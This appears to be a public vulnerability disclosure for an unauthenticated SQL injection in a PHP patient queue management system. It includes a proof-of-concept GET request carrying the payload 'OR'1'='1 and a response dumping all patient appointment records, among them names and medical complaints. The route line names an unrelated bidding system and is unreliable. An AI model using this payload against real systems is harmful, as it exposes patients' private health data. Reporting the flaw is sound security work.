SQL vulnerability exists in Patients Waiting Area Queue Management System

official website:https://www.sourcecodester.com/php/18348/patients-waiting-area-queue-management-system.html

version:v1.0

route：/simple-online-bidding-system/admin/index.php?page=categories

related code file：api_patient_checkin.php

related_function：getPatientAppointment()

#### 1.Vulnerability analysis

The `getPatientAppointment()` function in `php/api_patient_checkin.php` receives the `appointmentID` parameter via GET request without validating or escaping the incoming parameter. It directly concatenates this parameter into the SQL query statement, which allows attackers to insert malicious SQL statements and steal all patient data (SQL Injection).

![](Patients Waiting Area Queue Management System SQL.assets\image-20260129170944821.png)





![image-20260129171030422](.assets\image-20260129171030422.png)



#### 2.Vulnerability verification and exploit

This vulnerability does not require authentication. The exploit proof-of-concept (PoC) for this SQL Injection vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host field.

```
GET /pqms/php/api_patient_checkin.php?appointmentID='OR'1'='1 HTTP/1.1
Host: localhost:8088
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

After successfully executing the PoC, you can observe that the server returns a JSON response containing **all** patient appointment records stored in the database, instead of a single specific record, indicating a successful SQL injection attack.

```
HTTP/1.1 200 OK
Date: Thu, 29 Jan 2026 08:20:28 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
X-Powered-By: PHP/8.0.30
Content-Length: 1346
Connection: close
Content-Type: application/json

{"success":true,"appointment":[{"fullname":"James Kamanga","appointment_date":null,"doctor":" ","appointment":"General Consultation","time":null,"reason":"I would like you to check my balls","appnumber":"WALK202507041","id":"1"},{"fullname":"Joe Kajombo","appointment_date":null,"doctor":" ","appointment":"General Consultation","time":null,"reason":"I have swollen balls","appnumber":"WALK202507042","id":"2"},{"fullname":"Harry Maguire","appointment_date":null,"doctor":" ","appointment":"General Consultation","time":null,"reason":"I have fever","appnumber":"WALK202507043","id":"3"},{"fullname":"Mary Gama","appointment_date":null,"doctor":" ","appointment":"Follow-up Visit","time":null,"reason":"I would like to test HIV","appnumber":"WALK202507044","id":"4"},{"fullname":"Maxwel Maposa","appointment_date":null,"doctor":" ","appointment":"Urgent Care","time":null,"reason":"Fallen from a bike","appnumber":"WALK202507045","id":"5"},{"fullname":"Chikondi Gama","appointment_date":null,"doctor":" ","appointment":"Follow-up Visit","time":null,"reason":"This is very good","appnumber":"WALK202507056","id":"6"},{"fullname":"Happy Kaphukui","appointment_date":"2025-07-16 06:00:00","doctor":"Jane Mand","appointment":"Urgent Care","time":"14:00","reason":"i would like the doctor to check my swollen leg","appnumber":"APT202507167","id":"7"}]}
```

![image-20260129172012378](Patients Waiting Area Queue Management System SQL.assets\image-20260129172012378.png)




